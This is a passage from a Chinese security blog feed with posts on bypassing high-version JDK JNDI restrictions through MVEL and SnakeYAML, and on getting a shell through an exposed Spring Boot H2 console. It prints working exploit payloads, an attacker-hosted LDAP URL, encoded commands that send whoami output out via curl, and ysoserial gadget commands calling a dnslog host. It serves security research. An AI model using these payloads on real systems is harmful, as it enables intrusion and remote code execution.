href="https://xz.aliyun.com/t/2342">利用Java反射和类加载机制绕过JSP后门检测</a></li><li><a href="https://xz.aliyun.com/t/10583">从Spring内存马检测到隐形马</a></li><li><a href="https://landgrey.me/blog/12/">基于内存 Webshell 的无文件攻击技术研究</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NjA4MTQ1NQ==&mid=2247484259&idx=1&sn=2f132a952ec5e30ecefc9d3acef3cac5&chksm=cf36fb23f8417235ba1b14d9bd5c9efd3f293145b4e3b5a1b771f3a97316f15c0500fbfdb724&scene=132#wechat_redirect">Spring cloud gateway通过SPEL注入内存马</a></li><li><a href="https://gv7.me/articles/2020/semi-automatic-mining-request-implements-multiple-middleware-echo/">半自动化挖掘request实现多种中间件回显</a></li><li><a href="https://www.anquanke.com/post/id/214435">JSP Webshell那些事——攻击篇（上）</a></li><li><a href="https://xz.aliyun.com/t/10535">浅谈加载字节码相关的Java安全问题</a></li><li><a href="https://xz.aliyun.com/t/10075">Java内存攻击技术漫谈</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JNDI Bypass - MVEL</title>
      <link href="/2022/03/21/jndi-exec-by-mvel.html"/>
      <url>/2022/03/21/jndi-exec-by-mvel.html</url>
      
        <content type="html"><![CDATA[<h2 id="测试背景"><a href="#测试背景" class="headerlink" title="测试背景"></a>测试背景</h2><p>JDNI利用mvel绕过高版本java限制的时候，使用<a href="https://ares-x.com/tools/runtime-exec/">runtime exec</a>编码变形之后执行命令失败。只能弹个计算器。<br><img src="/2022/03/21/jndi-exec-by-mvel/1.png"></p><h2 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h2><p>浅蓝师傅在<a href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI 漏洞的利用方法</a>中给出的执行方式:</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"push Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先说结论：把执行命令的时候<code>push</code>指令去掉，可以成功执行命令。</p><h2 id="原因探索"><a href="#原因探索" class="headerlink" title="原因探索"></a>原因探索</h2><p>先把测试的命令做一次编码:<code>open /System/Applications/Calculator.app/Contents/MacOS/Calculator</code><br>经过编码之后： <code>bash -c &#123;echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcC9Db250ZW50cy9NYWNPUy9DYWxjdWxhdG9y&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><h3 id="存在push的时候"><a href="#存在push的时候" class="headerlink" title="存在push的时候"></a>存在push的时候</h3><p>经过一路的跳转，进入到<code>_exec()</code>函数，调用堆栈如下:</p><pre class="line-numbers language-none"><code class="language-none">_exec:122, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数在108行对传入的字符串进行分割: <code>String[] inTokens = this.inBuffer.append(this.commandBuffer).toString().split(&quot;\\s&quot;);</code>， <code>\s</code>表示空格、tab、换行: <code>&#39; &#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;</code>等<br><img src="/2022/03/21/jndi-exec-by-mvel/2.png"><br>分割之后，得到<code>inTokens</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">inTokens <span class="token operator">=</span> <span class="token punctuation">&#123;</span>String<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span>@1355<span class="token punctuation">&#125;</span>  <span class="token number">0</span> <span class="token operator">=</span> <span class="token string">"push"</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token string">"Runtime.getRuntime().exec('bash"</span> <span class="token number">2</span> <span class="token operator">=</span> <span class="token string">"-c"</span> <span class="token number">3</span> <span class="token operator">=</span> <span class="token string">"&#123;echo,L1N5c3RlbS9BcHBsaWNhdGlvbnMvQ2FsY3VsYXRvci5hcHAvQ29udGVudHMvTWFjT1MvQ2FsY3VsYXRvcg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后获取<code>inTokens[1:]</code>赋值给<code>passParamters</code>。继续跟进到119行代码: <code>((Command)this.commands.get(inTokens[0])).execute(this, passParameters);</code>，进入调用push指令的函数，此时的参数如下：<br><img src="/2022/03/21/jndi-exec-by-mvel/3.png"><br>在<code>pushContext.java</code>里面调用<code>MVEL.eval</code>解析MVEL表达式，这个时候可以看出来执行<code>MVEL.eval</code>的时候，第一个参数是args[0]: <code>Runtime.getRuntime().exec(&#39;bash</code>，所以会导致命令执行失败:<br><img src="/2022/03/21/jndi-exec-by-mvel/4.png"></p><h3 id="去掉push的时候"><a href="#去掉push的时候" class="headerlink" title="去掉push的时候"></a>去掉push的时候</h3><p>当没有push的时候，执行到<code>SHellSession.java</code>会跳转到123行代码分支，然后实例化<code>MVELInterpretedRuntime</code>之后调用<code>parse()</code>函数:<br><img src="/2022/03/21/jndi-exec-by-mvel/5.png"><br>经过一系列解析判断之后最终进入到<code>propertyAccessor.class</code>的896行，获取到<code>Runtime</code>上下文之后调用传入的参数:<br><img src="/2022/03/21/jndi-exec-by-mvel/6.png"><br>函数调用堆栈:</p><pre class="line-numbers language-none"><code class="language-none">getMethod:995, PropertyAccessor (org.mvel2)getNormal:181, PropertyAccessor (org.mvel2)get:145, PropertyAccessor (org.mvel2)get:125, PropertyAccessor (org.mvel2)getReducedValue:187, ASTNode (org.mvel2.ast)parseAndExecuteInterpreted:112, MVELInterpretedRuntime (org.mvel2)parse:58, MVELInterpretedRuntime (org.mvel2)_exec:171, ShellSession (org.mvel2.sh)exec:463, ShellSession (org.mvel2.sh)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)getObjectInstance:211, BeanFactory (org.apache.naming.factory)getObjectInstance:321, NamingManager (javax.naming.spi)decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)lookup:138, RegistryContext (com.sun.jndi.rmi.registry)lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)lookup:417, InitialContext (javax.naming)main:9, RMITest (com.rmi)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI漏洞的利用方法</a></li><li><a href="https://ares-x.com/tools/runtime-exec/">RUNTIME.EXEC PAYLOAD ENCODE</a></li><li><a href="https://github.com/JKme/EvilRMI">EvilRMI</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从Spring Boot H2 Database到GetShell</title>
      <link href="/2022/03/18/from-spring-boot-to-getshell.html"/>
      <url>/2022/03/18/from-spring-boot-to-getshell.html</url>
      
        <content type="html"><![CDATA[<h2 id="0x1-切入点"><a href="#0x1-切入点" class="headerlink" title="0x1. 切入点"></a>0x1. 切入点</h2><p>在日常测试的时候，使用ffuf发现一个<code>/console</code>的接口，打开之后发现是H2 Database页面：<br><img src="/2022/03/18/from-spring-boot-to-getshell/1.png"><br>如果Spring Boot项目中包含h2database并且在配置文件中启用h2-console，则存在<a href="https://anquan.baidu.com/article/1078">JNDI注入漏洞</a>.</p><p>设置<code>Driver Class</code>为<code>javax.naming.InitialContext</code>，<code>JDBC URL</code>为<code>ldap://attacker.com/Exploit</code>：<br><img src="/2022/03/18/from-spring-boot-to-getshell/2.png"><br>根据<code>/env</code>泄漏的信息，得知Java版本是1.8.0_312，高版本JDK中由于默认codebase为true从而导致客户端默认不会请求远程Server上的恶意 Class, 因此不可以直接使用LDAP加载远程恶意代码。</p><blockquote><p>RMI：JDK 8u113、JDK 7u122、JDK 6u132 起 codebase 默认为 true<br>LDAP：JDK 11.0.1、JDK 8u191、JDK 7u201、JDK 6u211 起 codebase 默认为 true</p></blockquote><h2 id="0x2-绕过和利用"><a href="#0x2-绕过和利用" class="headerlink" title="0x2. 绕过和利用"></a>0x2. 绕过和利用</h2><h3 id="利用本地Class作为Reference-Factory绕过"><a href="#利用本地Class作为Reference-Factory绕过" class="headerlink" title="利用本地Class作为Reference Factory绕过"></a>利用本地Class作为Reference Factory绕过</h3><p>利用URLDNS链可以探测Java黑盒应用里面某个类是否存在, 在珂字辈和c0ny1师傅的两篇文章讲的很详细：</p><ul><li><a href="https://mp.weixin.qq.com/s/DN9n_xAd0QRB2G1kjbeGMw">Urldns链探测类工具发放</a></li><li><a href="https://mp.weixin.qq.com/s/KncxkSIZ7HVXZ0iNAX8xPA">构造java探测class反序列化gadget</a></li><li><a href="https://mp.weixin.qq.com/s/p_mBiEhXuHa11usHPzHlEA">老链新用，利用URLDNS链探测gadget</a></li></ul><p>URLDNS的测试代码，生成一个序列化的数据包<code>1.ser</code>：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">test</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Urldns</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">URL</span><span class="token punctuation">(</span><span class="token string">"http://333.f9575af1.dns.1433.eu.org"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token class-name">Field</span> f <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.net.URL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//hashMap.put(url, org.apache.commons.beanutils.BeanComparator.class);</span>          hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.beanutils.BeanComparator"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"1.ser"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//ObjectInputStream ois = new ObjectInputStream(new FileInputStream("1.ser"));</span>        <span class="token comment">//ois.readObject();</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Class</span> <span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> clazzName<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ClassPool</span> classPool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> classPool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span>clazzName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctClass<span class="token punctuation">.</span><span class="token function">defrost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为动态生成的类也可以被反序列化，因此上面代码生成的序列化数据，最好在另外一个环境里面反序列化测试。<br>post请求提交上面生成的<code>1.ser</code>到<code>/yso</code>接口，如果生成<code>1.ser</code>里面的类在反序列化的时候存在，则会收到dnslog请求：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">ThreadContext</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>slf4j<span class="token punctuation">.</span></span><span class="token class-name">LoggerFactory</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span>core<span class="token punctuation">.</span>lookup<span class="token punctuation">.</span></span><span class="token class-name">UpperLookup</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token annotation punctuation">@ResponseBody</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestClass</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@PostMapping</span><span class="token punctuation">(</span><span class="token string">"/yso"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">URLDemo</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> response<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">ServletInputStream</span> inputStream <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectInputStream</span> objectInputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>inputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectInputStream<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LoggerFactory</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">TestClass</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@GetMapping</span><span class="token punctuation">(</span><span class="token string">"/log"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">echo</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestHeader</span><span class="token punctuation">(</span><span class="token string">"X-Api-Version"</span><span class="token punctuation">)</span> <span class="token class-name">String</span> apiVersion<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ThreadContext</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"apiVersion"</span><span class="token punctuation">,</span> apiVersion<span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"Received a request"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">UpperLookup</span> upperLookup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpperLookup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span>upperLookup<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"Hello, API Controller!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>珂字辈师傅已经写好了<a href="https://github.com/kezibei/Urldns">URLDNS</a>，可以生成探测需要的序列化数据包。当存在JNDI注入的时候，启动LDAP服务:<code>java -jar Urldns.jar ldap all &lt;dnslog&gt;</code>，然后使用PAYLOAD: <code>ldap://&lt;ip&gt;:1389/Hello233</code>。</p><h4 id="Snkeyml"><a href="#Snkeyml" class="headerlink" title="Snkeyml"></a>Snkeyml</h4><p>借用Ceye.io探测H2 Database的页面，发现可以利用的链很多，比如<code>cc1, cb17、mvel、snakeyaml</code>等，其中<code>cc1、cb17</code>这些链属于LDAP反序列化，<code>mvel、snkeyaml</code>属于加载本地Class。<br>浅蓝师傅在<a href="https://tttang.com/archive/1405/">探索高版本JDK下JNDI漏洞的利用方法</a>里面讲的很详细，这里选择使用<code>snkeyml</code>攻击，主要利用代码：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ResourceRef</span> <span class="token function">tomcat_snakeyaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.yaml.snakeyaml.Yaml"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> yaml <span class="token operator">=</span> <span class="token string">"!!javax.script.ScriptEngineManager [\n"</span> <span class="token operator">+</span>            <span class="token string">"  !!java.net.URLClassLoader [[\n"</span> <span class="token operator">+</span>            <span class="token string">"    !!java.net.URL [\"http://127.0.0.1:8888/exp.jar\"]\n"</span> <span class="token operator">+</span>            <span class="token string">"  ]]\n"</span> <span class="token operator">+</span>            <span class="token string">"]"</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=load"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> yaml<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ref<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在服务端使用RMI托管，然后开启<a href="https://github.com/artsploit/yaml-payload">yaml-payload.jar</a>，可以成功执行命令。</p><h4 id="Mvel"><a href="#Mvel" class="headerlink" title="Mvel"></a>Mvel</h4><p>在更换MVEL执行的时候，本地测试弹计算器成功，但是换成执行命令就会失败，使用IDEA本地调试之后发现把push去掉，然后可以执行命令成功，具体原因需要再跟踪一遍：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ReferenceWrapper</span> <span class="token function">tomcat_MVEL</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">NamingException</span> <span class="token punctuation">&#123;</span><span class="token class-name">ResourceRef</span> ref <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"org.mvel2.sh.ShellSession"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span>            <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"a=exec"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    ref<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span>            <span class="token string">"Runtime.getRuntime().exec('bash -c &#123;echo,Y3VybCBiYWlkdS5jb20vYHdob2FtaWA=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;');"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>ref<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利用LDAP返回反序列化数据，触发本地Gadget绕过"><a href="#利用LDAP返回反序列化数据，触发本地Gadget绕过" class="headerlink" title="利用LDAP返回反序列化数据，触发本地Gadget绕过"></a>利用LDAP返回反序列化数据，触发本地Gadget绕过</h3><p>LDAP Server除了使用JNDI Reference进行利用之外，还支持直接返回一个对象的序列化数据。如果Java对象的<code>javaSerializedData</code>属性值不为空，则客户端的<code>obj.decodeObject()</code>方法就会对这个字段的内容进行反序列化，攻击者仍然可以利用受害者本地CLASSPATH中存在漏洞的反序列化Gadget达到绕过限制执行命令的目的。</p><p>使用CC链生成之后托管在LDAP：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopyjava -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 <span class="token string">'curl xbaax2.ceye.io'</span><span class="token operator">|</span>base64 <span class="token operator">|</span>pbcopy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo">kxcode师傅的LDAP</a>托管生成的反序列化数据：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">java -cp HackerRMIRefServer-all.jar 